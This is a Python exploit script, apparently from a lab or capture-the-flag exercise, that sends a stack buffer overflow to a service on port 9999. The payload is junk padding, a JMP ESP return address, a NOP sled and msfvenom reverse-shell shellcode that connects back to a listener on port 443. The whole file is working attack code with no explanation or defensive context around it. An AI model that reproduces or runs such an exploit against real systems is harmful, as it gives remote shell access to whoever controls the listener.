#!/usr/bin/python3
from pwn import log, socket

offset = 524
junk = b"A" * offset
jmpesp = b"\xf3\x12\x17\x31"
nops = b"\x90" * 16

#❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.41 LPORT=443 EXITFUNC=thread -a x86 -b "\x00" -f python -v shellcode
shellcode =  b""
shellcode += b"\xd9\xe1\xd9\x74\x24\xf4\xb8\xb6\xfb\x1a\x01"
shellcode += b"\x5b\x29\xc9\xb1\x12\x31\x43\x17\x83\xc3\x04"
shellcode += b"\x03\xf5\xe8\xf8\xf4\xc8\xd5\x0a\x15\x79\xa9"
shellcode += b"\xa7\xb0\x7f\xa4\xa9\xf5\x19\x7b\xa9\x65\xbc"
shellcode += b"\x33\x95\x44\xbe\x7d\x93\xaf\xd6\xbd\xcb\x34"
shellcode += b"\x0f\x56\x0e\xb5\x4e\x1d\x87\x54\xe0\x07\xc8"
shellcode += b"\xc7\x53\x7b\xeb\x6e\xb2\xb6\x6c\x22\x5c\x27"
shellcode += b"\x42\xb0\xf4\xdf\xb3\x19\x66\x49\x45\x86\x34"
shellcode += b"\xda\xdc\xa8\x08\xd7\x13\xaa"

log.info("Enviando shellcode")

shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = shell.connect(("192.168.100.62", 9999))

shell.send(junk + jmpesp + nops + shellcode + b"\n\r")

data = shell.recv(1024)
shell.close()

log.success("Revisa tu listener")
